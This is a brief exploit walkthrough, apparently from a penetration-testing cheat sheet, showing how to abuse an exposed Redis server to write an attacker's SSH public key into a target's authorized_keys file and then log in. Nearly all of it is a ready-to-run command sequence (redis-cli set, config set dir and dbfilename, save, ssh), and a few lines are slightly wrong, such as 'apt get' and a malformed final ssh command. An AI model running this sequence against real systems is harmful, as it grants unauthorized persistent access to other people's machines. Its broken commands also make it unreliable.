# Creating a new `Authorized_keys`
## Summary
We are going to use Redis to write a new `authorized_keys` file.
## Exploit
```
# install the Redis cli
sudo apt get redis-cli

# Generate a new RSA Key
ssh-keygen -t rsa

# Add some lines before and after the key
(echo -e "\n\n"; cat ~/id_rsa_generated.pub; echo -e "\n\n") > spaced_key.txt

# use -x to read the last command from STDIN to `cat` the file into redis-cli
cat spaced_key.txt | redis-cli -h [IP] -x set chvxt3r

# Login to redis-cli
redis-cli -h [IP]

# Set the correct directory
config set dir [path-to-.ssh]

# set the dbfilename
config set dbfilename 'authorized_keys'

# Save
save

# Now you can login
ssh -i id_rsa_generated@[IP]
```
